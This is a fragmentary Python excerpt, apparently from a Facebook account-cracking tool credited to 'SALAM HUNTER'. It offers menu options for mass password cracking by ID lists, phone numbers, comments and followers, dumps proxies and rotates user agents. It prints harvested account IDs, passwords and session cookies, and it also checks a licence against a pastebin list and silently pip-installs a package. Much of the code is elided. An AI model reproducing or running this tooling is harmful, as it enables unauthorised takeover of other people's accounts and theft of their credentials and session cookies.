...
try:
	...
	os.system('pip install --upgrade SalamHunter')
...
\033[1;36m__________________×______________________\n
   {M}[ {P}FACEBOOK CRACK PUBLIG {M}]
   {M}[ {P}Author   : SALAM HUNTER {M}]
   {M}[ {P}Admin : @SALAMMZORI {M}]
   {M}[ {P}Telegram Channel : @T5B55 {M}]
   {M}[ {P}Github   : @SALAMMZERE3 {M}]
...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n{M} [!] Sedang Dump Proxy Dan Create Useragent')
...
def login_lagi334():
	try:
		...
		print(f'\033[1;31m╰─ Login BAD Your Token/Cookie Expired  ')
		exit()
...
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin()) +'_SALAM'
  ...
  try: 
    ...
    httpCaht = requests.get("https://pastebin.com/raw/VisYs0pA").text 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m BO ID ACTIVE KRDN @salammzori") 

      os.system('xdg-open  https://t.me/salammzori')
...
def menu(n,t):
	...
	print(f" {P}[{hh}13{P}]{K} UPDATE TOOL ")
	ask = input(f' {P}[{hh}>>{P}] CHOOSE : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_masal(t,c)
	elif ask in ['2','02']:crack_masal1(t,c)
	elif ask in ['3','03']:crack_nomor(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ["5", "05"]:crack_foll(t,c)
	...
	elif ask in ['13']:update_tool()
	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] wrong input bro")
	else:
		sys.exit(f" [{M}>{P}] wrong input bro")
		exit()
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						print(f'\r├── THANATOS-OK  : {hh}{idf}|{pw}{P}          \n│   └──  Cookies  : {hh}{kuki}          {P}\n└──  Ugent : {hh}{ua}{P}\n')
						os.popen
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
...
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] THANATOS-OK  : {hh}{idf}{P}          \n [{hh}>{P}] Sandi  : {hh}{pw}          {P}\n [{hh}>{P}] Cookie : {hh}{kuki}{P}')
	try:		
